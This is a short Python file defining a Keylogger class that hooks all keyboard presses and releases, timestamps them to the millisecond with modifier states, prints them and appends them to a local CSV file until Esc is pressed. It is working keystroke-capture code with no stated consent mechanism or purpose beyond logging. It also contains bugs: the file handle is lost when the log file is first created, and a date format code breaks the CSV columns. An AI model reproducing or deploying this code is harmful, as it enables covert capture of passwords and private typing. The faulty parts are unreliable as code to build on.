import os
import time
from datetime import datetime

import keyboard


class Keylogger:
    def __init__(self):
        self.t_array = ['Y', 'm', 'D', 'H', 'M', 'S']
        self.mods = ['shift', 'ctrl', 'alt', 'windows']
        if not (os.path.exists('pylogs.csv') and os.path.isfile('pylogs.csv')):
            file = open(f'pylogs.csv', 'w')
            file.write('year,month,day,hour,minute,sec,millis,isDown,shift,ctrl,alt,win,key\n')
        else:
            self.file = open(f'pylogs.csv', 'a')
        self.presses = {}

    def log_press(self, event):
        t = datetime.now()
        key = str(event)[14:len(str(event)) - 1].split(' ')[0]
        if key in keyboard.all_modifiers or key in self.presses:
            return
        row = self.format_row(key, t)
        self.presses[key] = [row]
        keyboard.on_release_key(key, callback=self.log_release)
        if key == 'esc':
            self.file.close()

    def format_row(self, key, t):
        mod = ','.join(['1' if keyboard.is_pressed(mod) else '0' for mod in self.mods])
        millis = int((time.mktime(t.timetuple()) + t.microsecond / 1E6) * 1000) % 1000
        time_str = ','.join([f'{t.strftime("%" + i)}' for i in self.t_array])
        row = f'{time_str},{millis},1,{mod},{key}\n'
        return row

    def log_release(self, event):
        t = datetime.now()
        key = str(event)[14:len(str(event)) - 1].split(' ')[0]
        if key in keyboard.all_modifiers or not key in self.presses:
            return
        entry = self.presses[key]
        entry.append(self.format_row(key, t))
        both_rows = ''.join(self.presses[key])
        print(both_rows)
        self.file.write(both_rows)
        if key == 'esc':
            self.file.close()
        del self.presses[key]

    def start(self):
        keyboard.on_press(callback=self.log_press)
        keyboard.wait('esc')  
